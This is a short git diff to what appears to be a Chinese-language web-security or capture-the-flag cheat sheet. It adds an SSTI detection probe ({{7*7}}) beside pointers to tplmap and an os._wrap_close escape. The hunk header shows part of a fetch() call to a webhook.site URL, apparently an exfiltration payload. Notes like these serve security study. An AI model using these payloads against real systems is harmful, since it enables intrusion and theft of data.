@@ -57,7 +57,8 @@ fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GE
 
 #### [Command Injection - feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)
 
-#### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/): 
+#### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
+* 先確認是不是真的有這個問題: {% raw %}`{{7*7}}`{% endraw %} → 49
 * 用[tplmap](https://github.com/epinna/tplmap)直接打
 * SSTI Payload: 記得找<span style="background-color: yellow">os.\_wrap_close</span>
     {% raw %}
